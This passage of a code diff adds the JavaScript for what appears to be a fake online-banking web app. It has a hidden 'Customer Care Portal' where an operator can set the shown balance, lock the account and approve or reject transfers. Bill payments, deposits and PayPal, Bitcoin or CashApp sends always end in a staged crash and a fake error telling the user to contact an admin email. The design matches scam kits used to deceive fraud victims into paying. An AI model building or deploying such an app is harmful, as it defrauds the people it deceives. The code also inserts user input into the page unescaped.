Changes</button></div></main></div>';
+        }
+
+        // ==================== RENDER CUSTOMER CARE ====================
+        function renderCustomerCare(container) {
+            const pending = Storage.getPendingTransfers();
+            const isLocked = Storage.getLocked();
+            let pendingHtml = '';
+            if (pending.length === 0) {
+                pendingHtml = '<p class="p-6 text-gray-400 text-center">No pending transfers</p>';
+            } else {
+                for (let i = 0; i < pending.length; i++) {
+                    const transfer = pending[i];
+                    pendingHtml += '<div class="p-4 flex items-center justify-between"><div><p class="text-white font-medium">$' + transfer.amount.toLocaleString() + ' to ' + transfer.bank + '</p><p class="text-gray-400 text-sm">Recipient: ' + transfer.recipientName + ' | Account: ' + transfer.account + '</p><p class="text-gray-500 text-xs mt-1">' + transfer.date + '</p></div><div class="flex gap-2"><button onclick="approveTransfer(' + i + ')" class="px-4 py-2 bg-green-600 text-white rounded hover:bg-green-700">Approve</button><button onclick="rejectTransfer(' + i + ')" class="px-4 py-2 bg-red-600 text-white rounded hover:bg-red-700">Reject</button></div></div>';
+                }
+            }
+            
+            const statusClass = isLocked ? 'text-red-400' : 'text-green-400';
+            const statusText = isLocked ? 'LOCKED' : 'ACTIVE';
+            
+            container.innerHTML = '<div class="min-h-screen bg-gray-900"><header class="bg-gray-800 shadow-sm"><div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8"><div class="flex items-center justify-between h-16"><div class="flex items-center gap-3"><div class="w-10 h-10 bg-blue-600 rounded-lg flex items-center justify-center"><i class="fas fa-headset text-white"></i></div><span class="text-white font-bold text-xl">Customer Care Portal</span></div><button onclick="logout()" class="text-gray-300 hover:text-white"><i class="fas fa-sign-out-alt mr-2"></i>Logout</button></div></div></header><main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8"><div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8"><div class="bg-gray-800 rounded-xl p-6"><h3 class="text-lg font-semibold text-white mb-4">Account Status: <span class="' + statusClass + '">' + statusText + '</span></h3><div class="flex gap-4"><button onclick="lockAccount()" class="flex-1 h-12 bg-red-600 text-white rounded-lg hover:bg-red-700 transition-colors"><i class="fas fa-lock mr-2"></i>Lock Account</button><button onclick="unlockAccount()" class="flex-1 h-12 bg-green-600 text-white rounded-lg hover:bg-green-700 transition-colors"><i class="fas fa-unlock mr-2"></i>Unlock Account</button></div></div><div class="bg-gray-800 rounded-xl p-6"><h3 class="text-lg font-semibold text-white mb-4">Edit Account Details</h3><div class="space-y-3"><div><label class="text-gray-400 text-xs">Account Name</label><input type="text" id="care-name" value="' + Storage.getName() + '" class="w-full h-10 px-3 bg-gray-700 text-white rounded border border-gray-600"></div><div><label class="text-gray-400 text-xs">Date of Birth (DD/Mon/YYYY)</label><input type="text" id="care-dob" value="' + Storage.getDOB() + '" class="w-full h-10 px-3 bg-gray-700 text-white rounded border border-gray-600"></div><div><label class="text-gray-400 text-xs">Account Balance ($)</label><input type="number" id="care-balance" value="' + Storage.getBalance() + '" class="w-full h-10 px-3 bg-gray-700 text-white rounded border border-gray-600"></div><button onclick="updateAccountDetails()" class="w-full h-10 bg-blue-600 text-white rounded hover:bg-blue-700 font-medium">Update Details</button></div></div></div><div class="bg-gray-800 rounded-xl overflow-hidden"><div class="p-6 border-b border-gray-700"><h3 class="text-lg font-semibold text-white">Pending Transfers (' + pending.length + ')</h3></div><div class="divide-y divide-gray-700">' + pendingHtml + '</div></div></main></div>';
+        }
+
+        // ==================== ACTION FUNCTIONS ====================
+        function showProfileMenu() { currentView = 'settings'; Storage.setLastView('settings'); render(); }
+        function showSettings() { currentView = 'settings'; Storage.setLastView('settings'); render(); }
+        function toggleBalanceDisplay() { showBalanceValue = !showBalanceValue; Storage.setShowBalance(showBalanceValue); render(); }
+        function toggleAccountDisplay() { showAccountValue = !showAccountValue; Storage.setShowAccount(showAccountValue); render(); }
+
+        function showNotifications() {
+            const notifications = Storage.getNotifications();
+            let notifHtml = '';
+            if (notifications.length === 0) { notifHtml = '<p class="text-gray-500 text-center py-4">No notifications</p>'; }
+            else {
+                for (let i = 0; i < notifications.length; i++) {
+                    const n = notifications[i];
+                    const bgClass = n.read ? 'bg-white' : 'bg-blue-50';
+                    const unreadDot = n.read ? '' : '<span class="w-2 h-2 bg-blue-600 rounded-full"></span>';
+                    notifHtml += '<div class="p-4 border-b border-gray-200 ' + bgClass + '"><div class="flex items-start justify-between"><div><p class="font-medium text-gray-900">' + n.title + '</p><p class="text-sm text-gray-600 mt-1">' + n.message + '</p><p class="text-xs text-gray-400 mt-2">' + n.date + '</p></div>' + unreadDot + '</div></div>';
+                }
+            }
+            showModal('Notifications', '<div class="max-h-96 overflow-y-auto custom-scrollbar">' + notifHtml + '</div>', function() { const updated = notifications.map(function(n) { return Object.assign({}, n, {read: true}); }); Storage.setNotifications(updated); render(); });
+        }
+
+        function showSearch() {
+            showModal('Search', '<div class="space-y-4"><input type="text" id="search-input" placeholder="Search transactions..." class="w-full h-12 px-4 border border-gray-300 rounded-lg focus:border-blue-500 focus:ring-2 focus:ring-blue-200" onkeyup="performSearch(this.value)"><div id="search-results" class="max-h-64 overflow-y-auto custom-scrollbar"></div></div>', null, false);
+            setTimeout(function() { document.getElementById('search-input').focus(); }, 100);
+        }
+
+        function performSearch(query) {
+            const resultsDiv = document.getElementById('search-results');
+            if (!query) { resultsDiv.innerHTML = ''; return; }
+            const history = Storage.getHistory();
+            const matches = history.filter(function(h) { return h.description.toLowerCase().includes(query.toLowerCase()) || h.date.includes(query) || h.amount.toString().includes(query); });
+            if (matches.length === 0) { resultsDiv.innerHTML = '<p class="text-gray-500 text-center py-4">No results found</p>'; return; }
+            let html = '';
+            for (let i = 0; i < matches.length; i++) {
+                const m = matches[i];
+                const amountClass = m.type === 'credit' ? 'text-green-600' : 'text-red-600';
+                const sign = m.type === 'credit' ? '+' : '';
+                html += '<div class="p-3 border-b border-gray-100 flex items-center justify-between"><div><p class="font-medium">' + m.description + '</p><p class="text-sm text-gray-500">' + m.date + '</p></div><span class="font-semibold ' + amountClass + '">' + sign + '$' + Math.abs(m.amount).toLocaleString() + '</span></div>';
+            }
+            resultsDiv.innerHTML = html;
+        }
+
+        function showFullHistory() {
+            const history = Storage.getHistory();
+            let html = '';
+            for (let i = 0; i < history.length; i++) {
+                const item = history[i];
+                const iconClass = item.type === 'credit' ? 'fa-arrow-down text-green-600' : 'fa-arrow-up text-red-600';
+                const bgClass = item.type === 'credit' ? 'bg-green-100' : 'bg-red-100';
+                const amountClass = item.type === 'credit' ? 'text-green-600' : 'text-red-600';
+                const sign = item.type === 'credit' ? '+' : '';
+                html += '<div class="p-4 border-b border-gray-200 flex items-center justify-between"><div class="flex items-center gap-4"><div class="w-10 h-10 ' + bgClass + ' rounded-full flex items-center justify-center"><i class="fas ' + iconClass + '"></i></div><div><p class="font-medium text-gray-900">' + item.description + '</p><p class="text-sm text-gray-500">' + item.date + '</p></div></div><span class="font-semibold ' + amountClass + '">' + sign + '$' + Math.abs(item.amount).toLocaleString('en-US', {minimumFractionDigits: 2}) + '</span></div>';
+            }
+            showModal('Transaction History', '<div class="max-h-96 overflow-y-auto custom-scrollbar">' + html + '</div>', null, false);
+        }
+
+        function showTransferModal() {
+            if (Storage.getLocked()) { showToast('Account is locked. Contact customer care.', 'error'); return; }
+            const banks = ['Bank of America', 'Wells Fargo', 'Citibank', 'US Bank', 'PNC Bank', 'Capital One', 'TD Bank', 'Truist', 'Chase Bank', 'Goldman Sachs', 'Morgan Stanley', 'Charles Schwab', 'Fidelity', 'Vanguard', 'American Express', 'Discover Bank', 'Ally Bank', 'Marcus by Goldman Sachs', 'Synchrony Bank', 'Barclays'];
+            let bankOptions = '';
+            for (let i = 0; i < banks.length; i++) { bankOptions += '<option value="' + banks[i] + '">' + banks[i] + '</option>'; }
+            const content = '<form id="transfer-form" class="space-y-4"><div><label class="block text-sm font-medium text-gray-700 mb-1">From</label><select class="w-full h-12 px-4 border border-gray-300 rounded-lg focus:border-blue-500 focus:ring-2 focus:ring-blue-200 bg-gray-100"><option>Checking Account (****' + Storage.getAccountNumber().slice(-4) + ') - $' + Storage.getBalance().toLocaleString() + '</option></select></div><div><label class="block text-sm font-medium text-gray-700 mb-1">Search Bank</label><input type="text" id="transfer-bank-search" placeholder="Enter bank name" class="w-full h-12 px-4 border border-gray-300 rounded-lg focus:border-blue-500 focus:ring-2 focus:ring-blue-200 mb-2" onkeyup="filterBanks(this.value)"><select id="transfer-bank" class="w-full h-12 px-4 border border-gray-300 rounded-lg focus:border-blue-500 focus:ring-2 focus:ring-blue-200">' + bankOptions + '</select></div><div><label class="block text-sm font-medium text-gray-700 mb-1">Recipient Name</label><input type="text" id="transfer-recipient" placeholder="Enter recipient full name" class="w-full h-12 px-4 border border-gray-300 rounded-lg focus:border-blue-500 focus:ring-2 focus:ring-blue-200" required></div><div><label class="block text-sm font-medium text-gray-700 mb-1">Recipient Account Number</label><input type="text" id="transfer-account" placeholder="Enter account number" class="w-full h-12 px-4 border border-gray-300 rounded-lg focus:border-blue-500 focus:ring-2 focus:ring-blue-200" required></div><div><label class="block text-sm font-medium text-gray-700 mb-1">Amount</label><input type="number" id="transfer-amount" placeholder="0.00" step="0.01" class="w-full h-12 px-4 border border-gray-300 rounded-lg focus:border-blue-500 focus:ring-2 focus:ring-blue-200" required></div><div><label class="block text-sm font-medium text-gray-700 mb-1">Description</label><input type="text" id="transfer-desc" placeholder="Optional description" class="w-full h-12 px-4 border border-gray-300 rounded-lg focus:border-blue-500 focus:ring-2 focus:ring-blue-200"></div></form>';
+            showModal('Transfer Money', content, function() {
+                const bank = document.getElementById('transfer-bank').value;
+                const recipientName = document.getElementById('transfer-recipient').value;
+                const account = document.getElementById('transfer-account').value;
+                const amount = parseFloat(document.getElementById('transfer-amount').value);
+                const desc = document.getElementById('transfer-desc').value || 'Transfer';
+                if (!recipientName || !account || !amount || amount <= 0) { showToast('Please fill all fields correctly', 'error'); return; }
+                if (amount > Storage.getBalance()) { showToast('Insufficient funds', 'error'); return; }
+                closeModal();
+                setTimeout(function() { requestTransferPIN(bank, recipientName, account, amount, desc); }, 100);
+            });
+        }
+
+        function filterBanks(query) {
+            const select = document.getElementById('transfer-bank');
+            if (!select) return;
+            const banks = ['Bank of America', 'Wells Fargo', 'Citibank', 'US Bank', 'PNC Bank', 'Capital One', 'TD Bank', 'Truist', 'Chase Bank', 'Goldman Sachs', 'Morgan Stanley', 'Charles Schwab', 'Fidelity', 'Vanguard', 'American Express', 'Discover Bank', 'Ally Bank', 'Marcus by Goldman Sachs', 'Synchrony Bank', 'Barclays'];
+            const filtered = banks.filter(function(b) { return b.toLowerCase().includes(query.toLowerCase()); });
+            let options = '';
+            for (let i = 0; i < filtered.length; i++) { options += '<option value="' + filtered[i] + '">' + filtered[i] + '</option>'; }
+            select.innerHTML = options;
+        }
+
+        function requestTransferPIN(bank, recipientName, account, amount, desc) {
+            const content = '<div class="text-center"><div class="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4"><i class="fas fa-lock text-blue-600 text-2xl"></i></div><p class="text-gray-600 mb-2">Transfer to: <strong>' + recipientName + '</strong></p><p class="text-gray-600 mb-2">Bank: <strong>' + bank + '</strong></p><p class="text-gray-600 mb-2">Amount: <strong>$' + amount.toLocaleString() + '</strong></p><p class="text-gray-600 mb-4">Enter your 4-digit PIN</p><input type="password" id="transfer-pin-input" maxlength="4" placeholder="****" class="w-full h-12 px-4 text-center text-2xl tracking-widest border border-gray-300 rounded-lg focus:border-blue-500 focus:ring-2 focus:ring-blue-200"></div>';
+            showModal('Transfer PIN', content, function() {
+                const pin = document.getElementById('transfer-pin-input').value;
+                if (pin === CONFIG.transferPIN) {
+                    const pending = Storage.getPendingTransfers();
+                    pending.push({ bank: bank, recipientName: recipientName, account: account, amount: amount, description: desc, date: new Date().toISOString().split('T')[0], id: Date.now() });
+                    Storage.setPendingTransfers(pending);
+                    const notifications = Storage.getNotifications();
+                    notifications.unshift({ id: Date.now(), title: 'New Transfer Request', message: 'Transfer of $' + amount.toLocaleString() + ' to ' + recipientName + ' requires approval', date: new Date().toISOString().split('T')[0], read: false });
+                    Storage.setNotifications(notifications);
+                    showToast('Transfer pending approval from customer care.', 'warning');
+                    closeModal();
+                } else { showToast('Invalid PIN. Please try again.', 'error'); }
+            });
+            setTimeout(function() { document.getElementById('transfer-pin-input').focus(); }, 100);
+        }
+
+        function showPayBillModal() {
+            if (Storage.getLocked()) { showToast('Account is locked. Contact customer care.', 'error'); return; }
+            const content = '<form id="paybill-form" class="space-y-4"><div><label class="block text-sm font-medium text-gray-700 mb-1">Payee</label><input type="text" id="bill-payee" placeholder="Enter payee name" class="w-full h-12 px-4 border border-gray-300 rounded-lg focus:border-blue-500 focus:ring-2 focus:ring-blue-200" required></div><div><label class="block text-sm font-medium text-gray-700 mb-1">Bill Account Number</label><input type="text" id="bill-account" placeholder="Enter bill account number" class="w-full h-12 px-4 border border-gray-300 rounded-lg focus:border-blue-500 focus:ring-2 focus:ring-blue-200" required></div><div><label class="block text-sm font-medium text-gray-700 mb-1">Amount</label><input type="number" id="bill-amount" placeholder="0.00" step="0.01" class="w-full h-12 px-4 border border-gray-300 rounded-lg focus:border-blue-500 focus:ring-2 focus:ring-blue-200" required></div></form>';
+            showModal('Pay Bill', content, function() {
+                const payee = document.getElementById('bill-payee').value;
+                const amount = parseFloat(document.getElementById('bill-amount').value);
+                if (!payee || !amount || amount <= 0) { showToast('Please fill all fields correctly', 'error'); return; }
+                closeModal();
+                showToast('Processing payment...', 'info');
+                setTimeout(function() { showCrashEffect(); setTimeout(function() { showToast('System Error: Payment service temporarily unavailable. Please contact ' + CONFIG.adminEmail, 'error'); }, 1500); }, 2000);
+            });
+        }
+
+        function showDepositModal() {
+            if (Storage.getLocked()) { showToast('Account is locked. Contact customer care.', 'error'); return; }
+            const content = '<form id="deposit-form" class="space-y-4"><div><label class="block text-sm font-medium text-gray-700 mb-1">Capture Check</label><div class="camera-preview"><i class="fas fa-camera text-4xl"></i></div></div><div class="flex gap-2"><button type="button" onclick="simulateCameraCapture()" class="flex-1 h-12 bg-blue-600 text-white rounded-lg hover:bg-blue-700"><i class="fas fa-camera mr-2"></i>Capture</button><button type="button" class="flex-1 h-12 bg-gray-200 text-gray-700 rounded-lg hover:bg-gray-300">Retake</button></div><div><label class="block text-sm font-medium text-gray-700 mb-1">Check Amount</label><input type="number" id="check-amount" placeholder="0.00" step="0.01" class="w-full h-12 px-4 border border-gray-300 rounded-lg focus:border-blue-500 focus:ring-2 focus:ring-blue-200"></div></form>';
+            showModal('Deposit Check', content, function() {
+                const amount = parseFloat(document.getElementById('check-amount').value);
+                if (!amount || amount <= 0) { showToast('Please enter check amount', 'error'); return; }
+                closeModal();
+                showToast('Processing deposit...', 'info');
+                setTimeout(function() { showCrashEffect(); setTimeout(function() { showToast('System Error: Deposit service temporarily unavailable. Please contact ' + CONFIG.adminEmail, 'error'); }, 1500); }, 2000);
+            });
+        }
+
+        function simulateCameraCapture() {
+            const preview = document.querySelector('.camera-preview');
+            if (preview) { preview.innerHTML = '<div class="text-center"><i class="fas fa-check-circle text-green-500 text-4xl mb-2"></i><p class="text-green-500 text-sm">Check Captured</p></div>'; }
+        }
+
+        function showPaymentMethods() {
+            const methods = Storage.getPaymentMethods();
+            let methodsHtml = '';
+            for (let i = 0; i < methods.length; i++) {
+                const m = methods[i];
+                let iconClass = 'fa-money-bill-wave text-green-600';
+                if (m.type === 'bitcoin') iconClass = 'fa-bitcoin text-orange-500';
+                if (m.type === 'paypal') iconClass = 'fa-paypal text-blue-600';
+                const btnClass = m.connected ? 'bg-green-100 text-green-700' : 'bg-gray-100 text-gray-600';
+                const btnText = m.connected ? 'Connected' : 'Connect';
+                methodsHtml += '<div class="flex items-center justify-between p-4 border border-gray-200 rounded-lg"><div class="flex items-center gap-3"><i class="fab ' + iconClass + ' text-2xl"></i><div><p class="font-medium">' + m.name + '</p><p class="text-sm text-gray-500">' + (m.connected ? 'Connected' : 'Not connected') + '</p></div></div><button onclick="showPaymentMethodModal(\'' + m.type + '\')" class="px-3 py-1 ' + btnClass + ' rounded-full text-sm">' + btnText + '</button></div>';
+            }
+            showModal('Payment Methods', '<div class="space-y-4">' + methodsHtml + '</div>', null, false);
+        }
+
+        function showPaymentMethodModal(type) {
+            closeModal();
+            let content = '';
+            let title = '';
+            if (type === 'paypal') {
+                title = 'Send via PayPal';
+                content = '<form class="space-y-4"><div><label class="block text-sm font-medium text-gray-700 mb-1">PayPal Email</label><input type="email" id="paypal-email" placeholder="email@example.com" class="w-full h-12 px-4 border border-gray-300 rounded-lg focus:border-blue-500 focus:ring-2 focus:ring-blue-200"></div><div><label class="block text-sm font-medium text-gray-700 mb-1">Amount</label><input type="number" id="paypal-amount" placeholder="0.00" step="0.01" class="w-full h-12 px-4 border border-gray-300 rounded-lg focus:border-blue-500 focus:ring-2 focus:ring-blue-200"></div></form>';
+            } else if (type === 'bitcoin') {
+                title = 'Send via Bitcoin';
+                content = '<form class="space-y-4"><div><label class="block text-sm font-medium text-gray-700 mb-1">Bitcoin Address</label><input type="text" id="btc-address" placeholder="1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa" class="w-full h-12 px-4 border border-gray-300 rounded-lg focus:border-blue-500 focus:ring-2 focus:ring-blue-200"></div><div><label class="block text-sm font-medium text-gray-700 mb-1">Amount (BTC)</label><input type="number" id="btc-amount" placeholder="0.00000000" step="0.00000001" class="w-full h-12 px-4 border border-gray-300 rounded-lg focus:border-blue-500 focus:ring-2 focus:ring-blue-200"></div></form>';
+            } else if (type === 'cashapp') {
+                title = 'Send via CashApp';
+                content = '<form class="space-y-4"><div><label class="block text-sm font-medium text-gray-700 mb-1">CashApp Tag</label><input type="text" id="cashapp-tag" placeholder="$username" class="w-full h-12 px-4 border border-gray-300 rounded-lg focus:border-blue-500 focus:ring-2 focus:ring-blue-200"></div><div><label class="block text-sm font-medium text-gray-700 mb-1">Amount</label><input type="number" id="cashapp-amount" placeholder="0.00" step="0.01" class="w-full h-12 px-4 border border-gray-300 rounded-lg focus:border-blue-500 focus:ring-2 focus:ring-blue-200"></div></form>';
+            }
+            showModal(title, content, function() {
+                closeModal();
+                showToast('Processing payment...', 'info');
+                setTimeout(function() { showCrashEffect(); setTimeout(function() { showToast('System Error: Payment service temporarily unavailable. Please contact ' + CONFIG.adminEmail, 'error'); }, 1500); }, 2000);
+            });
+        }
+
+        function saveSettings() {
+            const name = document.getElementById('settings-name').value;
+            const email = document.getElementById('settings-email').value;
+            const phone = document.getElementById('settings-phone').value;
+            if (name) Storage.setName(name);
+            if (email) Storage.setEmail(email);
+            if (phone) Storage.setPhone(phone);
+            showToast('Settings saved successfully', 'success');
+            currentView = 'dashboard';
+            Storage.setLastView('dashboard');
+            render();
+        }
+
+        // ==================== CUSTOMER CARE FUNCTIONS ====================
+        function lockAccount() {
+            Storage.setLocked(true);
+            showToast('Account has been LOCKED', 'success');
+            render();
+        }
+
+        function unlockAccount() {
+            Storage.setLocked(false);
+            showToast('Account has been UNLOCKED', 'success');
+            render();
+        }
+
+        function updateAccountDetails() {
+            const name = document.getElementById('care-name').value;
+            const dob = document.getElementById('care-dob').value;
+            const balance = parseFloat(document.getElementById('care-balance').value);
+            if (name) Storage.setName(name);
+            if (dob) Storage.setDOB(dob);
+            if (!isNaN(balance)) Storage.setBalance(balance);
+            showToast('Account details updated successfully', 'success');
+            render();
+        }
+
+        function approveTransfer(index) {
+            const pending = Storage.getPendingTransfers();
+            const transfer = pending[index];
+            if (transfer) {
+                const currentBalance = Storage.getBalance();
+                Storage.setBalance(currentBalance - transfer.amount);
+                const history = Storage.getHistory();
+                history.unshift({ date: new Date().toISOString().split('T')[0], description: 'Transfer to ' + transfer.recipientName + ' at ' + transfer.bank, amount: -transfer.amount, type: 'debit' });
+                Storage.setHistory(history);
+                pending.splice(index, 1);
+                Storage.setPendingTransfers(pending);
+                showToast('Transfer approved and processed', 'success');
+                render();
+            }
+        }
+
+        function rejectTransfer(index) {
+            const pending = Storage.getPendingTransfers();
+            pending.splice(index, 1);
+            Storage.setPendingTransfers(pending);
+            showToast('Transfer rejected', 'info');
+            render();
+        }
+
+        // ==================== MAIN RENDER ====================
+        function render() {
+            const app = document.getElementById('app');
+            if (!app) return;
+            Storage.setLastView(currentView);
+            switch(currentView) {
+                case 'login': renderLogin(app); break;
+                case 'dashboard': renderDashboard(app); break;
+                case 'settings': renderSettings(app); break;
+                case 'customercare': renderCustomerCare(app); break;
+                default: renderDashboard(app);
+            }
+        }
+
+        // ==================== INITIALIZATION ====================
+        document.addEventListener('DOMContentLoaded', function() {
+            initializeData();
+            checkSession();
+            render();
+        });
+    </script>
+</body>
+</html>
 node_modules/
 .env
